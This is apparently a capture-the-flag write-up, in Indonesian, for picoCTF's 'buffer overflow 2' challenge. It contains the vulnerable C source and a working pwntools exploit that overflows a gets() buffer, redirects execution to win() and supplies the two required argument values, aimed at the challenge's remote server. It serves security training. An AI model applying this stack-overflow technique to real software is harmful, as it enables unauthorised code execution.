# buffer oveflow 2
## Problem
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

## Diketahui
Mirip dengan buffer overflow 1, akan tetapi di sini kita diminta 2 argument dengan nilai arg1 == 0xCAFEF00D dan arg2 == 0xF00DF00D\
File ini adalah executeable 32-bit, sehingga argument akan disimpan distack, dengan anatomi sebagai berikut
```
[offset][return address][argc count][args 1][args 2]
```

## Payload
```
#!/usr/bin/env python3
from pwn import *

elf = ELF('./vuln')

win_addr = elf.symbols['win']

log.info(f"Alamat win: {hex(win_addr)}")

padding = b"A" * 112
padding1 = b"A" * 4
arg1 = p32(0xcafef00d)
arg2 = p32(0xf00df00d)
input1 = padding + p32(win_addr) + padding1 + arg1 + arg2

p = remote('saturn.picoctf.net', 64133)
#p = process('./vuln')

p.sendline(input1)
#print(p.clean().decode('latin-1'))
p.interactive()


```